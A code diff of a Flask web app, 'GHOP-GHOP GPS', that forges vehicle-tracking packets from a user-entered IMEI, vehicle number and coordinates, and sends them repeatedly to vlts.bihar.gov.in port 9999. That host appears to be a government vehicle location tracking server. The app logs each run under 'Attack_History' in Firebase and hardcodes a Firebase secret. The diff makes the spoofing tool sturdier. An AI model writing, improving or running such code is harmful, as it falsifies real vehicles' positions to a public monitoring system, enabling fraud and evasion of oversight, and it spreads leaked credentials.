@@ -3,14 +3,14 @@ from datetime import datetime, timedelta, timezone
 from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for
 
 app = Flask(__name__)
-app.secret_key = "nitro_v82_final_multi_device_edition_v2"
+app.secret_key = "nitro_v82_final_unbreakable_edition"
 
 FB_URL = "https://ghop-ghop-gps-injection-default-rtdb.firebaseio.com/"
 FB_SECRET = "hpa10b2FOtP4nP5aYjtMWSoq3bdp1n5sbH6lPDjE"
 
 TAG_LIST = ["RA18", "WTEX", "MARK", "ASPL", "LOCT14A", "ACT1", "AIS140", "VLTD", "AMAZON", "BBOX77", "EGAS", "MENT", "MIJO", "ROADRPA"]
 
-# Server-side memory for independent users
+# Server-side independent memory
 user_sessions = {}
 
 def get_ist_time():
@@ -72,10 +72,10 @@ DASH_HTML = """
         <h2 style="margin-top:10px;">💋 GHOP-GHOP GPS 💋</h2>
         <div class="metric" id="cnt">0</div>
         <form action="/action" method="post" class="grid">
-            <div class="full"><label>VEHICLE NO</label><input type="text" name="vno" id="vno" value="{{status.vno}}" oninput="this.value = this.value.toUpperCase(); updatePreview();" onblur="checkVehicle()"></div>
-            <div class="full"><label>IMEI</label><input type="text" name="imei" id="imei" value="{{status.imei}}" oninput="updatePreview();"></div>
-            <div><label>LATITUDE</label><input type="text" name="lat" id="lat" value="{{status.lat}}" oninput="updatePreview();"></div>
-            <div><label>LONGITUDE</label><input type="text" name="lon" id="lon" value="{{status.lon}}" oninput="updatePreview();"></div>
+            <div class="full"><label>VEHICLE NO</label><input type="text" name="vno" id="vno" value="{{status.vno}}" oninput="this.value = this.value.toUpperCase(); updatePreview();" onblur="checkVehicle()" required></div>
+            <div class="full"><label>IMEI</label><input type="text" name="imei" id="imei" value="{{status.imei}}" oninput="updatePreview();" required></div>
+            <div><label>LATITUDE</label><input type="text" name="lat" id="lat" value="{{status.lat}}" required></div>
+            <div><label>LONGITUDE</label><input type="text" name="lon" id="lon" value="{{status.lon}}" required></div>
             <button type="button" class="btn gps full" onclick="getLocation()">📍 GET CURRENT LOCATION</button>
             <div class="full"><label>📋 PACKET PREVIEW (MIJO FORMAT)</label><div class="preview" id="preview">Ready...</div></div>
             <button class="btn start full" name="btn" value="start">🔥 START ENGINE</button>
@@ -102,12 +102,12 @@ DASH_HTML = """
             let lon = document.getElementById('lon').value;
             let d = new Date().toLocaleDateString('en-GB').replace(/\//g, '');
             let t = new Date().toLocaleTimeString('en-GB', {hour12:false}).replace(/:/g, '');
-            let str = `$PVT,${tag},1.ONTC,NR,01,L,${imei},${vno},1,${d},${t},${lat},N,${lon},E,0.0,348.79,31,0033.96,2.00,0.40,airtel,0,1,029.2,004.1,0,C,29,405,52,065d,45c2,45c1,065d,24,eeca,065d,17,bfd4,065d,17,384c,065d,16,0000,00,014722,A3270A39*`;
-            document.getElementById('preview').innerText = str;
+            document.getElementById('preview').innerText = `$PVT,${tag},1.ONTC,NR,01,L,${imei},${vno},1,${d},${t},${lat},N,${lon},E,0.0,348.79,31,0033.96,2.00,0.40,airtel,0,1,029.2,004.1,0,C,29,405,52,065d,45c2,45c1,065d,24,eeca,065d,17,bfd4,065d,17,384c,065d,16,0000,00,014722,A3270A39*`;
         }
 
         async function checkVehicle() {
             let vno = document.getElementById('vno').value.toUpperCase();
+            if(!vno) return;
             let res = await fetch(`/check_vehicle?vno=${vno}`);
             let data = await res.json();
             if(data.imei) { document.getElementById('imei').value = data.imei; updatePreview(); }
@@ -126,18 +126,19 @@ DASH_HTML = """
 </html>
 """
 
-def log_to_firebase(uid, status_obj):
+def log_to_firebase(uid, s):
     try:
         now = get_ist_time()
-        sid = status_obj["session_id"]
-        log_data = {"Vehicle_No": status_obj["vno"], "IMEI_No": status_obj["imei"], "Lat": status_obj["lat"], "Lon": status_obj["lon"], "Start_Time": now.strftime('%H:%M:%S'), "Status": "Active"}
-        requests.put(f"{FB_URL}/Attack_History/{now.strftime('%Y-%m-%d')}/{uid}/{sid}_{status_obj['vno']}.json?auth={FB_SECRET}", json=log_data, timeout=5)
-        requests.put(f"{FB_URL}/Data_Records/{status_obj['vno']}.json?auth={FB_SECRET}", json=log_data, timeout=5)
+        sid = s["session_id"]
+        path = f"{FB_URL}/Attack_History/{now.strftime('%Y-%m-%d')}/{uid}/{sid}_{s['vno']}.json?auth={FB_SECRET}"
+        log_data = {"Vehicle_No": s["vno"], "IMEI_No": s["imei"], "Lat": s["lat"], "Lon": s["lon"], "Start_Time": now.strftime('%H:%M:%S'), "Status": "Active"}
+        requests.put(path, json=log_data, timeout=5)
+        requests.put(f"{FB_URL}/Data_Records/{s['vno']}.json?auth={FB_SECRET}", json=log_data, timeout=5)
     except: pass
 
 def firing_engine(uid):
     target = ("vlts.bihar.gov.in", 9999)
-    # Thread check for specific user
+    # Check firing status ONLY for this user
     while uid in user_sessions and user_sessions[uid]["firing"]:
         try:
             s = user_sessions[uid]
@@ -177,12 +178,24 @@ def action():
     uid = session.get('user')
     if not uid or uid not in user_sessions: return redirect(url_for('login'))
     val = request.form.get('btn')
-    if val == "start" and not user_sessions[uid]["firing"]:
-        user_sessions[uid].update({"firing":True, "session_id":get_ist_time().strftime('%H%M%S'), "imei":request.form.get('imei'), "vno":request.form.get('vno').upper(), "lat":request.form.get('lat'), "lon":request.form.get('lon')})
-        log_to_firebase(uid, user_sessions[uid])
-        threading.Thread(target=firing_engine, args=(uid,), daemon=True).start()
-    elif val == "stop": user_sessions[uid]["firing"] = False
-    elif val == "reset": user_sessions[uid].update({"firing":False, "count":0, "imei":"", "vno":""})
+    
+    if val == "start":
+        imei = request.form.get('imei', '').strip()
+        vno = request.form.get('vno', '').strip()
+        # BLANK CHECK: Don't start if IMEI or VNO is missing
+        if not imei or not vno:
+            return redirect(url_for('dashboard'))
+        
+        if not user_sessions[uid]["firing"]:
+            user_sessions[uid].update({"firing":True, "session_id":get_ist_time().strftime('%H%M%S'), "imei":imei, "vno":vno.upper(), "lat":request.form.get('lat'), "lon":request.form.get('lon')})
+            log_to_firebase(uid, user_sessions[uid])
+            threading.Thread(target=firing_engine, args=(uid,), daemon=True).start()
+    
+    elif val == "stop":
+        user_sessions[uid]["firing"] = False
+    elif val == "reset":
+        user_sessions[uid].update({"firing":False, "count":0, "imei":"", "vno":""})
+        
     return redirect(url_for('dashboard'))
 
 @app.route('/check_vehicle')
@@ -193,7 +206,6 @@ def check_vehicle():
 
 @app.route('/data')
 def data():
-    # FIXED: Only return data for the logged-in user session
     uid = session.get('user')
     if uid in user_sessions:
         return jsonify(user_sessions[uid])
